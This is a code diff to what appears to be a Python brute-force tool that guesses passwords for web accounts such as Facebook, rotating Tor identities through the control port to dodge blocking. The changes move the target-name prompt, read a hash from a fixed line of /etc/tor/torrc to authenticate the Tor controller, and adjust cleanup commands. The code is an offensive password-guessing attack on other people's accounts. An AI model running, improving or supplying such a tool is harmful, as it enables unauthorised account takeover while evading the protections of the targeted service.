@@ -34,7 +34,6 @@ def main():
 
     args = parser.parse_args()
 
-
     service = args.service
     username = args.username
     wordlist = args.password
@@ -51,9 +50,31 @@ def main():
     if delay is None:
 
         delay = 1
+    
+
+    global Hash, fb_name
+
+    os.system("clear")
+
+    if service == "facebook":
+
+        fb_name = raw_input(O + "Please Enter The NAME Of The Facebook Account : " + W)
+
+        os.system("clear")
+
+ 
+    os.system("/etc/init.d/tor restart && rm -rf tmp/ geckodriver.log") # restarting tor & removing geckodriver log
 
 
-    os.system("clear && /etc/init.d/tor restart && rm -rf tmp/ geckodriver.log") # restarting tor & removing geckodriver log
+    with open('/etc/tor/torrc','r') as f:
+
+        contents = f.readlines()
+
+        data = contents[59]
+
+        Hash = data.rsplit(":",1)[1]
+
+    print("[ " + G + "ok" + W + " ]" + " Successfully Scanned Password : " + Hash)
 
     Bruter(service, username, wordlist, delay).execute()
 
@@ -103,7 +124,7 @@ class Bruter(object):
 
         with Controller.from_port(port = 9051) as controller:
 
-            controller.authenticate()
+            controller.authenticate(password=Hash)
 
             controller.signal(Signal.NEWNYM)
 
@@ -121,21 +142,17 @@ class Bruter(object):
         self.webBruteforce(self.username, self.wordlist, self.service, self.delay)
 
 
-    def usercheck(self, username, service):   # Checking Username
+    def usercheck(self, username, service):          # Checking Username
 
        display = Display(visible=0, size=(800, 600)) # Pyvirtual display starting
 
        display.start()
-
-       global driver
 
        driver = webdriver.Firefox()
 
        try:
 
            if service == "facebook":
-
-               fb_name = raw_input(O + "Please Enter The NAME Of The Facebook Account : " + W)
 
                driver.get("https://www.facebook.com/public/" + fb_name)
 
@@ -166,6 +183,8 @@ class Bruter(object):
            return 1
 
     def webBruteforce(self, username, wordlist, service, delay):
+
+        global driver
 
         driver = webdriver.Firefox()
 
@@ -287,4 +306,6 @@ if __name__ == '__main__':
 
         print(R + "\nError : Keyboard Interrupt" + W)
 
-        self.stopTOR()
+        os.system("rm -rf tmp/ geckodriver.log && service tor stop")
+
+        exit(1)
